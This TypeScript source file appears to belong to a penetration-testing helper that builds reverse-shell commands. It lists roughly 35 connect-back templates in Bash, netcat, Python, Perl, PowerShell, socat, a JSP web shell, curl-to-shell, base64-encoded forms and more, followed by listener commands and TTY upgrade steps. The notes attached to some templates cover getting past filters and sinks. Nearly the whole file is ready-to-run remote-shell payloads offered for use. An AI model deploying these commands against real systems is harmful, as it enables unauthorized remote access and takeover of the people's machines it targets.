/**
 * Connect-back command generator.
 *
 * Produces the standard one-liner forms used to verify egress filtering and listener
 * handling during an authorized engagement. Templates carry `{HOST}`, `{PORT}` and
 * `{SHELL}` placeholders which are substituted at render time.
 *
 * These are strings. This module builds text; the application displays it, encodes it,
 * and can write it into the open buffer. Nothing here is executed, and no network
 * connection is ever opened by this application.
 */

export interface ShellTemplate {
  id: string;
  label: string;
  /** Where the command usually runs, so an operator can pick a reachable one. */
  platform: "Linux" | "Windows" | "Any";
  note: string;
  template: string;
}

export interface ListenerTemplate {
  id: string;
  label: string;
  note: string;
  template: string;
}

/** Shells offered for substitution into `{SHELL}`. */
export const SHELL_BINARIES = ["/bin/sh", "/bin/bash", "/bin/zsh", "cmd.exe", "powershell.exe"];

export const REVERSE_SHELLS: ShellTemplate[] = [
  {
    id: "bash-tcp", label: "Bash /dev/tcp", platform: "Linux",
    note: "Needs a bash compiled with /dev/tcp support; not present on Debian's dash",
    template: "bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1"
  },
  {
    id: "bash-udp", label: "Bash UDP", platform: "Linux",
    note: "UDP variant, paired with a UDP listener",
    template: "sh -i >& /dev/udp/{HOST}/{PORT} 0>&1"
  },
  {
    id: "bash-fd", label: "Bash file descriptor", platform: "Linux",
    note: "Avoids >& redirection where it is filtered",
    template: "0<&196;exec 196<>/dev/tcp/{HOST}/{PORT}; {SHELL} <&196 >&196 2>&196"
  },
  {
    id: "nc-e", label: "Netcat -e", platform: "Linux",
    note: "Only where netcat was built with GAPING_SECURITY_HOLE",
    template: "nc -e {SHELL} {HOST} {PORT}"
  },
  {
    id: "nc-fifo", label: "Netcat FIFO", platform: "Linux",
    note: "For netcat builds without -e; the usual fallback",
    template: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {SHELL} -i 2>&1 | nc {HOST} {PORT} > /tmp/f"
  },
  {
    id: "ncat-ssl", label: "Ncat over TLS", platform: "Any",
    note: "Wraps the session in TLS; pair with a matching listener",
    template: "ncat --ssl {HOST} {PORT} -e {SHELL}"
  },
  {
    id: "python", label: "Python 3", platform: "Any",
    note: "Spawns a pty, so job control and interactive prompts work",
    template: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{HOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"{SHELL}\")'"
  },
  {
    id: "python-short", label: "Python 3 (no pty)", platform: "Any",
    note: "Shorter form where pty is unavailable",
    template: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{HOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"{SHELL}\",\"-i\"])'"
  },
  {
    id: "perl", label: "Perl", platform: "Linux",
    note: "Common on older Unix hosts where Python is absent",
    template: "perl -e 'use Socket;$i=\"{HOST}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{SHELL} -i\");};'"
  },
  {
    id: "php", label: "PHP", platform: "Any",
    note: "Where a PHP binary or an eval sink is reachable",
    template: "php -r '$sock=fsockopen(\"{HOST}\",{PORT});exec(\"{SHELL} -i <&3 >&3 2>&3\");'"
  },
  {
    id: "ruby", label: "Ruby", platform: "Any",
    note: "Useful on Rails hosts",
    template: "ruby -rsocket -e 'f=TCPSocket.open(\"{HOST}\",{PORT}).to_i;exec sprintf(\"{SHELL} -i <&%d >&%d 2>&%d\",f,f,f)'"
  },
  {
    id: "node", label: "Node.js", platform: "Any",
    note: "For JavaScript runtimes and injection into Node services",
    template: "node -e 'require(\"child_process\").exec(\"nc {HOST} {PORT} -e {SHELL}\")'"
  },
  {
    id: "socat", label: "Socat", platform: "Linux",
    note: "Gives a fully interactive tty; pair with the socat listener",
    template: "socat TCP:{HOST}:{PORT} EXEC:'{SHELL}',pty,stderr,setsid,sigint,sane"
  },
  {
    id: "powershell", label: "PowerShell", platform: "Windows",
    note: "Standard Windows callback over a raw TCP client",
    template: "powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('{HOST}',{PORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
  },
  {
    id: "java", label: "Java", platform: "Any",
    note: "For JVM application servers",
    template: "r = Runtime.getRuntime(); p = r.exec([\"{SHELL}\",\"-c\",\"exec 5<>/dev/tcp/{HOST}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()"
  },
  {
    id: "awk", label: "Awk", platform: "Linux",
    note: "Where scripting languages are stripped but awk remains",
    template: "awk 'BEGIN {s = \"/inet/tcp/0/{HOST}/{PORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
  },
  {
    id: "golang", label: "Go", platform: "Any",
    note: "Compiled callback for hosts without interpreters",
    template: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{HOST}:{PORT}\");cmd:=exec.Command(\"{SHELL}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go"
  },
  {
    id: "openssl", label: "OpenSSL", platform: "Linux",
    note: "Encrypted channel; needs an s_server listener with a certificate",
    template: "mkfifo /tmp/s; {SHELL} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {HOST}:{PORT} > /tmp/s; rm /tmp/s"
  },
  {
    id: "telnet", label: "Telnet", platform: "Linux",
    note: "Two-port fallback for very old hosts",
    template: "TF=$(mktemp -u); mkfifo $TF && telnet {HOST} {PORT} 0<$TF | {SHELL} 1>$TF"
  },
  {
    id: "sh", label: "sh", platform: "Linux",
    note: "POSIX sh where bash is absent",
    template: "sh -i >& /dev/tcp/{HOST}/{PORT} 0>&1"
  },
  {
    id: "zsh", label: "Zsh", platform: "Linux",
    note: "Zsh module form; common on macOS",
    template: "zsh -c 'zmodload zsh/net/tcp && ztcp {HOST} {PORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
  },
  {
    id: "bash-b64", label: "Bash (base64 wrapped)", platform: "Linux",
    note: "Survives sinks that choke on quotes and redirection",
    template: "echo BASE64_OF_PAYLOAD | base64 -d | bash -i"
  },
  {
    id: "busybox", label: "BusyBox nc", platform: "Linux",
    note: "Embedded and container images",
    template: "busybox nc {HOST} {PORT} -e {SHELL}"
  },
  {
    id: "curl-pipe", label: "curl to shell", platform: "Linux",
    note: "Stages a script over HTTP; needs a served payload",
    template: "curl http://{HOST}:{PORT}/s | {SHELL}"
  },
  {
    id: "rustcat", label: "Rustcat", platform: "Linux",
    note: "Pairs with the rcat listener",
    template: "rcat connect -s {SHELL} {HOST} {PORT}"
  },
  {
    id: "c", label: "C", platform: "Linux",
    note: "Compile where a toolchain is present",
    template: "#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint main(void){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons({PORT});a.sin_addr.s_addr=inet_addr(\"{HOST}\");connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execve(\"{SHELL}\",0,0);return 0;}"
  },
  {
    id: "groovy", label: "Groovy", platform: "Any",
    note: "Jenkins script console and Groovy sandboxes",
    template: "String host=\"{HOST}\";int port={PORT};String cmd=\"{SHELL}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();"
  },
  {
    id: "crystal", label: "Crystal", platform: "Any",
    note: "Crystal runtime",
    template: "crystal eval 'require \"process\";require \"socket\";c=TCPSocket.new(\"{HOST}\",{PORT});loop{m,l=Bytes.new(1024),0;l=c.read(m);break if l==0;Process.run(String.new(m[0,l]),shell: true,output: c,error: c)}'"
  },
  {
    id: "dart", label: "Dart", platform: "Any",
    note: "Flutter and Dart server contexts",
    template: "import 'dart:io';import 'dart:convert';main(){Socket.connect(\"{HOST}\",{PORT}).then((socket){socket.listen((data){Process.start(\"{SHELL}\",[]).then((Process process){process.stdin.writeln(new String.fromCharCodes(data).trim());process.stdout.transform(utf8.decoder).listen((output){socket.write(output);});});},onDone:(){socket.destroy();});});}"
  },
  {
    id: "haskell", label: "Haskell", platform: "Any",
    note: "GHC runtime",
    template: "module Main where\nimport System.Process\nmain = callCommand \"nc {HOST} {PORT} -e {SHELL}\""
  },
  {
    id: "vlang", label: "V", platform: "Any",
    note: "V language runtime",
    template: "v -e 'import os; os.system(\"nc -e {SHELL} {HOST} {PORT}\")'"
  },
  {
    id: "war", label: "JSP / WAR", platform: "Any",
    note: "Drop into a servlet container webroot",
    template: "<%@page import=\"java.lang.*,java.util.*,java.io.*,java.net.*\"%><% Socket s=new Socket(\"{HOST}\",{PORT});Process p=Runtime.getRuntime().exec(\"{SHELL}\");InputStream pi=p.getInputStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);} %>"
  },
  {
    id: "powershell-b64", label: "PowerShell (base64)", platform: "Windows",
    note: "Encode the callback as UTF-16LE base64 and pass with -enc",
    template: "powershell -nop -w hidden -enc BASE64_UTF16LE_OF_PAYLOAD"
  },
  {
    id: "python-windows", label: "Python (Windows)", platform: "Windows",
    note: "No pty on Windows, so pipes are used",
    template: "python.exe -c \"import socket,subprocess,os,threading;s=socket.socket();s.connect(('{HOST}',{PORT}));p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE);threading.Thread(target=lambda:[s.send(p.stdout.read(1)) for _ in iter(int,1)]).start();[p.stdin.write(s.recv(1)) for _ in iter(int,1)]\""
  }
  ,{
    id: "lua", label: "Lua", platform: "Any",
    note: "For embedded and game-server contexts",
    template: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{HOST}','{PORT}');os.execute('{SHELL} -i <&3 >&3 2>&3');\""
  }
];

export const LISTENERS: ListenerTemplate[] = [
  { id: "nc", label: "Netcat", note: "The usual receiving end", template: "nc -lvnp {PORT}" },
  { id: "ncat-ssl", label: "Ncat over TLS", note: "Matches the TLS callback", template: "ncat --ssl -lvnp {PORT}" },
  { id: "socat", label: "Socat (interactive tty)", note: "Full job control, no upgrade needed", template: "socat file:`tty`,raw,echo=0 TCP-L:{PORT}" },
  { id: "openssl", label: "OpenSSL s_server", note: "Requires cert.pem and key.pem", template: "openssl s_server -quiet -key key.pem -cert cert.pem -port {PORT}" },
  { id: "pwncat", label: "Python http.server", note: "For staging a payload over HTTP", template: "python3 -m http.server {PORT}" }
];

/** Post-connection tty upgrades, which are the usual next step after a callback. */
export const TTY_UPGRADES: ListenerTemplate[] = [
  { id: "python-pty", label: "Python pty", note: "Run on the callback side", template: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
  { id: "stty", label: "Full tty (local side)", note: "Run locally after backgrounding the shell", template: "stty raw -echo; fg; reset; export SHELL=/bin/bash; export TERM=xterm-256color; stty rows 40 columns 160" },
  { id: "script", label: "script(1)", note: "Where Python is unavailable", template: "script -qc /bin/bash /dev/null" }
];

export interface ShellOptions {
  host: string;
  port: string;
  shell: string;
}

/** Substitutes host, port and shell into a template. */
export function renderTemplate(template: string, options: ShellOptions): string {
  return template
    .replace(/\{HOST\}/g, options.host || "127.0.0.1")
    .replace(/\{PORT\}/g, options.port || "4444")
    .replace(/\{SHELL\}/g, options.shell || "/bin/sh");
}
